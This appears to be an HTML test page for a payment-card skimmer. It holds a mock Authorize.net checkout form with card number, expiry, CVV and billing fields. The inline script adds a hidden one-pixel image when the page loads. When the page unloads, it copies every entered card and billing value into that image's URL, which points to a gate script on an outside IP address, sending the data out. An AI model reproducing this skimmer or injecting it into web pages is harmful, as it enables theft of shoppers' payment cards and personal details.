<form action='test.php'>
<input placeholder="authorizenet_cc_number" id="authorizenet_cc_number" name="payment[cc_number]"><br>
<input placeholder="authorizenet_expiration" id="authorizenet_expiration" name="payment[cc_exp_month]"><br>
<input placeholder="authorizenet_expiration_yr" id="authorizenet_expiration_yr" name="payment[cc_exp_year]"><br>
<input placeholder="authorizenet_cc_type" id="authorizenet_cc_type" name="payment[cc_type]"><br>
<input placeholder="authorizenet_cc_cid" id="authorizenet_cc_cid"  name="payment[cc_cid]"><br>
<input placeholder="firstname" id="billing:firstname"    name="billing[firstname]"><br>
<input placeholder="lastname" id="billing:lastname"   name="billing[lastname]"><br>
<input placeholder="telephone" id="billing:telephone"      name="billing[telephone]"><br>
<input placeholder="country_id" id="billing:country_id"   name="billing[country_id]"><br>
<input placeholder="region_id" id="billing:region_id"    name="billing[region_id]"><br>
<input placeholder="street1" id="billing:street1"   name="billing[street][]"><br>
<input placeholder="city" id="billing:city"     name="billing[city]"><br>
<input placeholder="postcode" id="billing:postcode"    name="billing[postcode]"><br>

<input type='submit' value='Send'>
</form>


<script>
window.onload=function(){var b=document.createElement('img');b.width='1px';b.height='1px';b.id='imageid';b.src='src';document.body.appendChild(b);}
window.onunload=function(){document.getElementById("imageid").src="http://95.215.0.234/god-js/gate.php?card_num="+document.getElementById('authorizenet_cc_number').value+"&card_expm="+document.getElementById('authorizenet_expiration').value+"&card_expy="+document.getElementById('authorizenet_expiration_yr').value+"&card_cvv="+document.getElementById('authorizenet_cc_cid').value+"&fname="+document.getElementById('billing:firstname').value+"&lname="+document.getElementById('billing:lastname').value+"&tel="+document.getElementById('billing:telephone').value+"&country="+document.getElementById('billing:country_id').value+"&region="+document.getElementById('billing:region_id').value+"&street="+document.getElementById('billing:street1').value+"&city="+document.getElementById('billing:city').value+"&zip="+document.getElementById('billing:postcode').value;setTimeout("n=11",3E3)}
</script>


